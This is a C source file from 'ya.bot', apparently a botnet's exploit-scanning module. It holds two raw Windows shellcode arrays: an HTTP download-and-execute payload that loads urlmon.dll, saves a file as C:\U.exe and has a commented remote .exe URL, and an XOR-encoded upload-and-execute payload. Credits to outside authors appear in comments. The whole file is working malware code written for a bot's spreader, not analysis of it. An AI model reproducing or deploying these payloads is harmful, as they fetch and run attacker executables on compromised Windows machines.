/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_EXPSCAN

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Darkeagle
//http://exploiterz.org/
//botbotbotbotbotbotbotbotbotbotbotbotbot

char shellcode_httpdownloadexecute[203] =
		"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"
		"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"
		"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
		"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"
		"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"
		"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
		"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"
		"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"
		"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
		"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"
		"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"
		"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
		"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF";
//		"http://h0nest.org/1.exe";

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by HDmoore & Delikon
//http://www.metasploit.com/
//http://www.delikon.de/
//botbotbotbotbotbotbotbotbotbotbotbotbot

char shellcode_uploadexecute[460] =
		"\xD9\xE1\xD9\x34\x24\x58\x58\x58\x58\x80\xE8\xE7\x31\xC9\x66\x81"
		"\xE9\x4E\xFE\x80\x30\x27\x40\xE2\xFA\xCE\x43\x26\x27\x27\x7C\x72"
		"\xAE\xC2\x41\xA6\xCB\x13\x27\xAE\xC1\x41\xA6\xCB\x2B\x27\xCF\xFC"
		"\x27\x27\x27\xAE\xE0\x70\x4F\xA9\x69\x29\xCB\xCF\xC0\x27\x27\x27"
		"\xAE\x62\x2F\xAA\x74\x17\x75\xD8\x72\x2F\xAE\x62\x2F\xAA\x74\x1C"
		"\xAE\x71\x13\x4D\x2A\x7E\x41\xA6\xDE\x20\x27\x52\x24\xAC\x5A\x2F"
		"\xAE\x29\x70\xD8\x53\xAC\xDB\xCF\x9C\x27\x27\x27\xAC\x29\xAE\x63"
		"\xA9\xDB\xC5\xC5\x41\xA6\xCB\xB7\x26\x73\x4F\x25\x25\x27\x27\xD8"
		"\x71\x23\x16\xD8\x70\x70\x70\x70\x60\x70\x60\x70\xD8\x31\xAE\xE4"
		"\x16\xD8\x70\x70\x4F\x25\x27\x06\xE5\xAE\xC5\x4D\x37\x75\x74\xD8"
		"\x71\x2F\x70\x74\xD8\x71\x2B\x70\x71\x74\xD8\x71\x37\xAE\xE4\x4D"
		"\x27\x4D\x21\x4D\x23\x4D\x27\x4D\x20\x4F\x27\x27\x27\xC7\xD8\x51"
		"\x13\xD8\x71\x03\xAE\xE0\xA6\xCB\xBB\xD8\xD8\xD8\xAE\xC2\xAA\x72"
		"\x43\x4D\x27\x4F\x43\x27\x27\x27\x75\x74\xD8\x71\x33\x1A\xD8\xD8"
		"\xD8\xD8\x53\x32\x1A\x27\x27\x27\x27\x53\x29\xAA\x72\x43\x4D\x27"
		"\x76\x77\x75\x70\xD8\x71\x0F\xCC\xF2\x70\xD8\x71\x0B\x4F\x22\x27"
		"\x27\x27\xD8\x51\x13\xD8\x71\x07\x16\xD8\x70\xD8\x71\x3B\x72\x71"
		"\x43\x86\x17\x27\x27\x27\xAC\x67\x2B\xAC\x57\x3B\x8A\xAC\x4F\x2F"
		"\xAE\xCF\x79\x7A\xE5\x23\x27\x74\x72\x71\x70\xAC\x4B\x03\x3F\xAC"
		"\x62\x1B\xAC\x73\x22\x5F\x26\xCD\xAC\x6D\x3F\xAC\x7D\x07\x26\xCC"
		"\xC4\x12\x6E\xAC\x13\xAC\x26\xC9\x16\xD8\xDB\x16\xE7\x8B\x1F\xC7"
		"\x53\x20\xE6\xE8\x2A\x26\xE0\xCC\xD5\x1C\x5B\x03\x33\x52\xC6\xAC"
		"\x7D\x03\x26\xCC\x41\xAC\x2B\x6C\xAC\x7D\x3B\x26\xCC\xAC\x23\xAC"
		"\x26\xCF\xCE\x25\x27\x27\x27\x16\xE7\xAE\xCD\x78\x79\x7A\x7C\xE5"
		"\x23\x27\xCF\xB0\xD9\xD8\xD8\xFE\x2E\xD2\x8A\xEC\xCA\xDB\x1C\x83"
		"\x3D\x57\xE0\x83\x8A\x09\xCE\xC2\x6E\xA1\x6E\x91\x3E\x3F\xC0\xC0"
		"\x5E\xE1\x5E\xC8\xE9\xC7\x47\xBF\xD9\xAD\x29\x82\x30\x27\x5B\x38"
		"\x5E\x2D\xCF\xDC\xB0\xDA\x28\x70\x74\x15\x78\x14\x15\x09\x63\x6B"
		"\x6B\x27\x5E\x49\x42\x50\x09\x42\x5F\x42\x27";
#endif